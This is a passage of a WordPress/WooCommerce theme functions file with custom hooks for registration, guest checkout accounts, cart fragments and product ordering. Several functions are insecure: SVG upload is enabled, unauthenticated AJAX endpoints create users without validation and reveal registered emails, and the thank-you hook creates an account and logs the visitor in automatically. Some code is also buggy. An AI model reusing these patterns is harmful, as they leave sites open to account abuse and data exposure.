$translated_text = __( 'fdf Info', 'woocommerce' );
break;
}
return $translated_text;
}
add_filter( 'gettext', 'sdasdasd', 20, 3 );
add_filter('body_class','obw_woocommerce_body_classes');
function obw_woocommerce_body_classes( $classes ) {
    global $woocommerce, $post, $product;
    $product = get_product( $post->ID );
    $product_type = $product->product_type;
    if ( $product->product_type == 'external' ) $classes[] = 'external-product';
    if ( $product->product_type == 'grouped' ) $classes[] = 'grouped-product';
    if ( $product->product_type == 'simple' ) $classes[] = 'simple-product';
    if ( $product->product_type == 'variable' ) $classes[] = 'variable-product';
    return $classes;
}
function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');
add_filter('add_to_cart_fragments', 'woocommerce_header_add_to_cart_fragment');
 
function woocommerce_header_add_to_cart_fragment( $fragments ) {
	global $woocommerce;
	
	ob_start();
	
	?>
	<a class="cart-contents" href="<?php echo $woocommerce->cart->get_cart_url(); ?>" title="<?php _e('View your shopping cart', 'woothemes'); ?>">
		<span class="cart-contents-count cart-count"><?php echo sprintf(_n('%d', '%d', $woocommerce->cart->cart_contents_count, 'woothemes'), $woocommerce->cart->cart_contents_count);?></span>
	</a>
	<?php
	
	$fragments['a.cart-contents'] = ob_get_clean();
	
	return $fragments;
	
}



add_filter( 'comment_form_defaults', 'sp_comment_submit_button' );
function sp_comment_submit_button( $defaults ) {
if(!is_user_logged_in()){
        $defaults['label_submit'] = __( 'Login / Signup', 'custom' );
} else if(is_user_logged_in()){
		$defaults['label_submit'] = __( 'Rate', 'custom' );
}		
        return $defaults;
}
/*********************Redirect Register User to thenk You Page*************************/
/*add_action( 'pp_after_registration', 'pp_redirect_after_registration', 10, 3 );
function pp_redirect_after_registration( $form_id, $user_data, $user_id ) {
 $a = get_user_by( 'id', $user_id );
 
 
 $user_roles = $a->roles;
 if ( in_array( 'student', $user_roles ) ) {
 $redirect = 'http://xyz.com/welcome-student/';
 }
 elseif ( in_array( 'teacher', $user_roles ) ) {
 $redirect = 'http://xyz.com/welcome-teacher/';
 }
 else {
 $redirect = 'http://xyz.com/welcome/';
 }
 
 wp_redirect( $redirect );
 exit;
}*/
/*add_filter('woocommerce_registration_redirect', 'ps_wc_registration_redirect');
function ps_wc_registration_redirect( $redirect_to ) {
     $redirect_to = site_url().'/thank-you/';
     return $redirect_to;
}*/
add_action('wp_head', 'some_function');
function some_function() {
    if(is_page('thank-you') || is_page('thanks-for-registration')) { ?>
        <meta http-equiv="refresh" content="3; URL=<?php echo site_url(); ?>"> <?php
    }
}







/*function auto_login_new_user( $user_id ) {

        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);
        // You can change home_url() to the specific URL,such as 
        //wp_redirect( 'http://www.wpcoke.com' );
        wp_redirect( get_permalink('4688') );
        exit;
    }
	
add_action( 'user_register', 'auto_login_new_user' );*/


/*add_action( 'wpmem_post_register_data', 'my_registration_hook', 1 );
function my_registration_hook( $fields ) {
    $user_login = $fields['username'];
    $user_id = $fields['ID'];

    wp_set_current_user( $user_id );
    wp_set_auth_cookie( $user_login );
    do_action( 'wp_login', $user_login );

    wp_set_current_user( $fields['ID'] );
	
	wp_redirect( get_permalink('507') );
    exit;
		
}*/
	
	
	
	
// add taxoonomy term to body_class
function woo_custom_taxonomy_in_body_class( $classes ){
  if( is_page('shop') )
  {
        $classes[] = 'page_shop';
  }
  return $classes;
}
add_filter( 'body_class', 'woo_custom_taxonomy_in_body_class' );

function rkv_remove_columns( $columns ) {
	// remove the Yoast SEO columns
	unset( $columns['date'] );
	unset( $columns['language'] );
	unset( $columns['sku'] );
	unset( $columns['product_tag'] );
	unset( $columns['product_type'] );
	
	return $columns;
}
add_filter ( 'manage_edit-product_columns', 'rkv_remove_columns' );



remove_action('woocommerce_pagination', 'woocommerce_pagination', 10);

/*function woocommerce_pagination() {
		wp_pagenavi(); 		
	}
add_action( 'woocommerce_pagination', 'woocommerce_pagination', 10);*/



function sww_add_images_woocommerce_emails( $output, $order ) {
	
	// set a flag so we don't recursively call this filter
	static $run = 0;
  
	// if we've already run this filter, bail out
	if ( $run ) {
		return $output;
	}
  
	$args = array(
		'show_image'   	=> true,
		'image_size'    => array( 100, 100 ),
	);
  
	// increment our flag so we don't run again
	$run++;
  
	// if first run, give WooComm our updated table
	return $order->email_order_items_table( $args );
}
add_filter( 'woocommerce_email_order_items_table', 'sww_add_images_woocommerce_emails', 10, 2 );


add_action('woocommerce_multistep_checkout_before', 'add_my_custom_step_with_new_field');
function add_my_custom_step_with_new_field( $checkout ) {
  wc_get_template( '/woocommerce/checkout/my-custom-step.php', array( 'checkout' => $checkout ) );
}


function vb_register_user_scripts() {
  // Enqueue script
  wp_register_script('vb_reg_script', get_template_directory_uri() . '/js/ajax-registration.js', array('jquery'), null, false);
  wp_enqueue_script('vb_reg_script');
 
  wp_localize_script( 'vb_reg_script', 'vb_reg_vars', array(
        'vb_ajax_url' => admin_url( 'admin-ajax.php' ),
      )
  );
}
add_action('wp_enqueue_scripts', 'vb_register_user_scripts', 100);



function vb_reg_new_user() {
 
  // Verify nonce
  if( !isset( $_POST['nonce'] ) || !wp_verify_nonce( $_POST['nonce'], 'vb_new_user' ) )
    die( 'Ooops, something went wrong, please try again later.' );

  // Post values
	$username = $_POST['user'];
	$password = $_POST['pass'];
	$email    = $_POST['mail'];
	$name     = $_POST['name'];
	$nick     = $_POST['nick'];
 	
 	/**
 	 * IMPORTANT: You should make server side validation here!
 	 *
 	 */

	$userdata = array(
		'user_login' => $username,
		'user_pass'  => $password,
		'user_email' => $email,
		'first_name' => $name,
		'nickname'   => $nick,
	);

	$user_id = wp_insert_user( $userdata ) ;

	//On success
	if( !is_wp_error($user_id) ) {
		echo '1';
	} else {
		echo $user_id->get_error_message();
	} 
  die();
	
}
 
 
add_action('wp_ajax_register_user', 'vb_reg_new_user');
add_action('wp_ajax_nopriv_register_user', 'vb_reg_new_user');




function wc_register_guests( $order_id ) {
  // get all the order data
  $order = new WC_Order($order_id);
  //get the user email from the order
  $order_email = $order->billing_email;
  
 
  // check if there are any users with the billing email as user or email
  $email = email_exists( $order_email );  
  $user = username_exists( $order_email );
	
	$random_password  = $order->billing_myfield17;
	
    $user_id = wp_create_user( $order_email, $random_password, $order_email );
    
	//print_r($order);
	
	/*echo 'P/w: '.$random_password = $order->account_password;
	echo 'name: '.$order->billing_first_name;
	echo 'last name: '.$order->billing_last_name;
	echo 'asse: '.$order->billing_address_1;
	echo 'aasdasd: '.$order->billing_address_2;
	echo 'city: '.$order->billing_city;
	echo 'com: '.$order->billing_company;*/
	
	//WC guest customer identification
    //update_user_meta( $user_id, 'guest', 'yes' );
    //user's billing data
	
	
	update_user_meta( $user_id, 'first_name', $order->billing_first_name);
    update_user_meta( $user_id, 'last_name', $order->billing_last_name);
	update_user_meta( $user_id, 'gender', $order->billing_city );
    update_user_meta( $user_id, 'billing_address_1', $order->billing_address_1 );
    update_user_meta( $user_id, 'billing_address_2', $order->billing_address_2 );
    update_user_meta( $user_id, 'billing_city', $order->billing_city );
    update_user_meta( $user_id, 'billing_company', $order->billing_company );
    update_user_meta( $user_id, 'billing_country', $order->billing_country );
    update_user_meta( $user_id, 'billing_email_n', $order->billing_email );
	update_user_meta( $user_id, 'billing_email', $order->billing_email );
    update_user_meta( $user_id, 'billing_first_name', $order->billing_first_name);
    update_user_meta( $user_id, 'billing_last_name', $order->billing_last_name);
    update_user_meta( $user_id, 'billing_phone', $order->billing_phone );
    update_user_meta( $user_id, 'billing_postcode', $order->billing_postcode );
    update_user_meta( $user_id, 'billing_state', $order->billing_state );
	
	
	update_user_meta( $user_id, 'billing_myfield12', $order->billing_myfield12 );
	update_user_meta( $user_id, 'billing_myfield13', $order->billing_myfield13 );
	update_user_meta( $user_id, 'billing_myfield14', $order->billing_myfield14 );
	update_user_meta( $user_id, 'billing_myfield15', $order->billing_myfield15 );
	update_user_meta( $user_id, 'billing_myfield16', $order->billing_myfield16 );
	
    // user's shipping data
    update_user_meta( $user_id, 'shipping_address_1',$order->shipping_address_1 );
    update_user_meta( $user_id, 'shipping_address_2',$order->shipping_address_2 );
    update_user_meta( $user_id, 'shipping_city',$order->shipping_city );
    update_user_meta( $user_id, 'shipping_company',$order->shipping_company );
	update_user_meta( $user_id, 'shipping_email',$order->billing_email );
	//update_user_meta( $user_id, 'shipping_phone',$order->shipping_phone);
	
    update_user_meta( $user_id, 'shipping_country', $order->shipping_country );
    update_user_meta( $user_id, 'shipping_first_name', $order->shipping_first_name );
    update_user_meta( $user_id, 'shipping_last_name', $order->shipping_last_name );
    update_user_meta( $user_id, 'shipping_method', $order->shipping_method);
    update_user_meta( $user_id, 'shipping_postcode', $order->shipping_postcode);
    update_user_meta( $user_id, 'shipping_state', $order->shipping_state);
	
	update_user_meta( $user_id, 'shipping_myfield10', $order->shipping_myfield10);
	update_user_meta( $user_id, 'shipping_myfield11', $order->shipping_myfield11);
	update_user_meta( $user_id, 'shipping_myfield12', $order->shipping_myfield12);
	update_user_meta( $user_id, 'shipping_myfield4', $order->shipping_myfield4);
	update_user_meta( $user_id, 'shipping_phone', $order->shipping_myfield4);
	
	
	
	
    
    // link past orders to this newly created customer
    wc_update_new_customer_past_orders( $user_id );
	
	wp_set_current_user($user_id);
    wp_set_auth_cookie($user_id);
		
  //}
  
}
 
//add this newly created function to the thank you page
add_action( 'woocommerce_thankyou', 'wc_register_guests', 10, 1 );




add_action('wp_enqueue_scripts', 'live_validation' );
add_action('wp_ajax_validate_email', 'validate_email_input');
add_action('wp_ajax_nopriv_validate_email', 'validate_email_input');

function live_validation() {
	wp_enqueue_script( "validate_email", get_template_directory_uri().'/js/email_check.js', array( 'jquery' ) );
	wp_localize_script( "validate_email", "validateEmail", array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ) );
}

function validate_email_input() {
	$email = $_POST['email'];
	if ( email_exists($email) ) {
		echo 1; 
	} else {
		echo 0;
	}
	exit;
}






function duplicate_menu_options_page() {
    add_theme_page( 'Duplicate Menu', 'Duplicate Menu', 'manage_options', 'duplicate-menu', array( 'DuplicateMenu', 'options_screen' ) );
}

add_action( 'admin_menu', 'duplicate_menu_options_page' );

/**
* Duplicate Menu
*/
class DuplicateMenu {

    function duplicate( $id = null, $name = null ) {

        // sanity check
        if ( empty( $id ) || empty( $name ) ) {
	        return false;
        }

        $id = intval( $id );
        $name = sanitize_text_field( $name );
        $source = wp_get_nav_menu_object( $id );
        $source_items = wp_get_nav_menu_items( $id );
        $new_id = wp_create_nav_menu( $name );

        if ( ! $new_id ) {
            return false;
        }

        // key is the original db ID, val is the new
        $rel = array();

        $i = 1;
        foreach ( $source_items as $menu_item ) {
            $args = array(
                'menu-item-db-id'       => $menu_item->db_id,
                'menu-item-object-id'   => $menu_item->object_id,
                'menu-item-object'      => $menu_item->object,
                'menu-item-position'    => $i,
                'menu-item-type'        => $menu_item->type,
                'menu-item-title'       => $menu_item->title,
                'menu-item-url'         => $menu_item->url,
                'menu-item-description' => $menu_item->description,
                'menu-item-attr-title'  => $menu_item->attr_title,
                'menu-item-target'      => $menu_item->target,
                'menu-item-classes'     => implode( ' ', $menu_item->classes ),
                'menu-item-xfn'         => $menu_item->xfn,
                'menu-item-status'      => $menu_item->post_status
            );

            $parent_id = wp_update_nav_menu_item( $new_id, 0, $args );

            $rel[$menu_item->db_id] = $parent_id;

            // did it have a parent? if so, we need to update with the NEW ID
            if ( $menu_item->menu_item_parent ) {
                $args['menu-item-parent-id'] = $rel[$menu_item->menu_item_parent];
                $parent_id = wp_update_nav_menu_item( $new_id, $parent_id, $args );
            }

	        // allow developers to run any custom functionality they'd like
	        do_action( 'duplicate_menu_item', $menu_item, $args );

            $i++;
        }

        return $new_id;
    }

    function options_screen() {
        $nav_menus = wp_get_nav_menus();
    ?>
    <div class="wrap">
        <div id="icon-options-general" class="icon32"><br /></div>
            <h2><?php _e( 'Duplicate Menu' ); ?></h2>

            <?php if ( ! empty( $_POST ) && wp_verify_nonce( $_POST['duplicate_menu_nonce'], 'duplicate_menu' ) ) : ?>
                <?php
                    $source         = intval( $_POST['source'] );
                    $destination    = sanitize_text_field( $_POST['new_menu_name'] );

                    // go ahead and duplicate our menu
                    $duplicator = new DuplicateMenu();
                    $new_menu_id = $duplicator->duplicate( $source, $destination );
                ?>

                <div id="message" class="updated"><p>
                    <?php if ( $new_menu_id ) : ?>
                        <?php _e( 'Menu Duplicated' ) ?>. <a href="nav-menus.php?action=edit&amp;menu=<?php echo absint( $new_menu_id ); ?>"><?php _e( 'View' ) ?></a>
                    <?php else: ?>
                        <?php _e( 'There was a problem duplicating your menu. No action was taken.' ) ?>.
                    <?php endif; ?>
                </p></div>

            <?php endif; ?>


            <?php if ( empty( $nav_menus ) ) : ?>
                <p><?php _e( "You haven't created any Menus yet." ); ?></p>
            <?php else: ?>
                <form method="post" action="">
                    <?php wp_nonce_field( 'duplicate_menu','duplicate_menu_nonce' ); ?>
                    <table class="form-table">
                        <tr valign="top">
                            <th scope="row">
                                <label for="source"><?php _e( 'Duplicate this menu' ); ?>:</label>
                            </th>
                            <td>
                                <select name="source">
                                    <?php foreach ( (array) $nav_menus as $_nav_menu ) : ?>
                                        <option value="<?php echo esc_attr($_nav_menu->term_id) ?>">
                                            <?php echo esc_html( $_nav_menu->name ); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                                <span style="display:inline-block; padding:0 10px;"><?php _e( 'and call it' ); ?></span>
                                <input name="new_menu_name" type="text" id="new_menu_name" value="" class="regular-text" />
                            </td>
                    </table>
                    <p class="submit">
                        <input type="submit" name="submit" id="submit" class="button-primary" value="Duplicate Menu" />
                    </p>
                </form>
            <?php endif; ?>
        </div>
    <?php }
}


function set_default_display_name( $user_id ) {
  $user = get_userdata( $user_id );
  
  $name = sprintf( '%s %s', $user->first_name, $user->last_name );
  $args = array(
    'ID' => $user_id,
    'display_name' => $name,
    'nickname' => $name
  );
  wp_update_user( $args );
}
add_action( 'user_register', 'set_default_display_name' );


add_filter( 'pre_user_login' , 'wpso_same_user_email' );

function wpso_same_user_email( $user_login ) {

    if( isset($_POST['billing_email'] ) ) {
        $user_login = $_POST['billing_email'];
    }
    if( isset($_POST['email'] ) ) {
        $user_login = $_POST['email'];
    }
    return $user_login;
}

add_filter('next_posts_link_attributes', 'posts_link_attributes');
//add_filter('previous_posts_link_attributes', 'posts_link_attributes');

function posts_link_attributes() {
    return 'class="next"';
}





function woocommerce_ordering_function() {
    global $wp_query;

   	if (is_page('new-arrivals') || is_page('new-arrivals-man')) { ?>
	<form class="woocommerce-ordering" method="get" class="sdgdf">
	<select name="orderby" class="orderby">
		<?php 
		$orderby                 = isset( $_GET['orderby'] ) ? wc_clean( $_GET['orderby'] ) : apply_filters( 'woocommerce_default_catalog_orderby', get_option( 'woocommerce_default_catalog_orderby' ) );
		$catalog_orderby_options = apply_filters( 'woocommerce_catalog_orderby', array(
			'menu_order' => __( 'Default sorting', 'woocommerce' ),
			'popularity' => __( 'Sort by popularity', 'woocommerce' ),
			'rating'     => __( 'Sort by average rating', 'woocommerce' ),
			'date'       => __( 'Sort by newness', 'woocommerce' ),
			'price'      => __( 'Sort by price: low to high', 'woocommerce' ),
			'price-desc' => __( 'Sort by price: high to low', 'woocommerce' )
		) );
		foreach ( $catalog_orderby_options as $id => $name ) : ?>
			<option value="<?php echo esc_attr( $id ); ?>" <?php selected( $orderby, $id ); ?>><?php echo esc_html( $name ); ?></option>
		<?php endforeach; ?>
	</select>
	<?php
		// Keep query string vars intact
		foreach ( $_GET as $key => $val ) {
			if ( 'orderby' === $key || 'submit' === $key ) {
				continue;
			}
			if ( is_array( $val ) ) {
				foreach( $val as $innerVal ) {
					echo '<input type="hidden" name="' . esc_attr( $key ) . '[]" value="' . esc_attr( $innerVal ) . '" />';
				}
			} else {
				echo '<input type="hidden" name="' . esc_attr( $key ) . '" value="' . esc_attr( $val ) . '" />';
			}
		}
	?>
</form>
<?php 
} else { 
    $orderby = isset( $_GET['orderby'] ) ? wc_clean( $_GET['orderby'] ) : apply_filters( 'woocommerce_default_catalog_orderby', get_option( 'woocommerce_default_catalog_orderby' ) );
	if (is_page('new-arrivals') || is_page('new-arrivals-man')) {
    $show_default_orderby    = 'menu_order' === apply_filters( 'woocommerce_default_catalog_orderby', get_option( 'woocommerce_default_catalog_orderby' ) );
    } else {
    $show_default_orderby    = 'menu_order' === apply_filters( 'woocommerce_default_catalog_orderby', get_option( 'woocommerce_default_catalog_orderby' ) );
	}
	
    $catalog_orderby_options = apply_filters( 'woocommerce_catalog_orderby', array(
      'menu_order' => __( 'Default sorting', 'woocommerce' ),
      'popularity' => __( 'Sort by popularity', 'woocommerce' ),
      'rating'     => __( 'Sort by average rating', 'woocommerce' ),
      'date'       => __( 'Sort by newness', 'woocommerce' ),
      'price'      => __( 'Sort by price: low to high', 'woocommerce' ),
      'price-desc' => __( 'Sort by price: high to low', 'woocommerce' ),
    ) );

    if ( ! $show_default_orderby ) {
      unset( $catalog_orderby_options['menu_order'] );
    }

    if ( 'no' === get_option( 'woocommerce_enable_review_rating' ) ) {
      unset( $catalog_orderby_options['rating'] );
    }

    wc_get_template( 'loop/orderby.php', array( 'catalog_orderby_options' => $catalog_orderby_options, 'orderby' => $orderby, 'show_default_orderby' => $show_default_orderby ) );
  }
 } 
add_shortcode('woocommerce_ordering','woocommerce_ordering_function');  






add_action( 'woocommerce_single_variation', 'bbloomer_echo_stock_variations_loop' );
 
function bbloomer_echo_stock_variations_loop(){
global $product;
    if ($product->get_type() == 'variable') {
		echo '<div class="quantity-rem">';
        foreach ($product->get_available_variations() as $key) {
        $attr_string = '';
			
			foreach ( $key['attributes'] as $attr_name => $attr_value) {
				$attr_string[] = $attr_value;
            }
            if ( $key['max_qty'] > 0 ) { 
				echo '<p class="varition-pro error" id="'.$key['id'].'">&nbsp;&nbsp;<span>'.$key['max_qty'].'</span>&nbsp;pieces left </p>'; 
			} else if($key['max_qty'] == 0) {
				echo '<p class="varition-pro error" id="'.$key['id'].'">&nbsp; Not Available</p>'; 
			}
			
			/*else { 
				echo '<span class="">'.implode(', ', $attr_string) . ': out of stock </span>'; 
				}*/
            }
		echo '</div>';	
			
			
    }
}





add_action('woocommerce_single_variation','is_attr_in_cart');
function is_attr_in_cart( $attribute_value ){

    $found = false;

    if( WC()->cart->is_empty() ) return $found;
    else {
		echo '<div class="rem-qty">';
        foreach ( WC()->cart->get_cart() as $cart_item ){
            if( 0 != $cart_item['variation_id'] ){
				//echo '<pre>'.print_r($cart_item).'</pre>';
				
				$total_qua = $cart_item['data']->stock_quantity;
				$quanti = $cart_item['quantity'];
				$rem_qua = ($total_qua) - ($quanti);  
				echo $variation_id = '<div class="cart-itm" style="display:none;" data-id='.$cart_item['variation_id'].' data-tot="'.$total_qua.'" data-cart="'.$quanti.'" data-rem="'.$rem_qua.'">'.$cart_item['quantity'].'</div>';
					
            }
            if($found) break;
        }
		
		?>
				<script>
				jQuery(document).ready(function(){
					jQuery('select').blur( function(){
						jQuery('.rem-qty .cart-itm').each(function() {
									var cart_id = jQuery(this).attr('data-id');
									var data_rem = jQuery(this).attr('data-rem');
									jQuery('.quantity-rem .varition-pro').each(function() {
									var var_ac = jQuery(this).attr('id');
										if (cart_id == var_ac) {
											jQuery('#'+cart_id).find('span').html(data_rem);	
										}
									});
						});
					});
						
				});
				</script>
			<?php
		echo '</div>';

        return $found;
    }
}
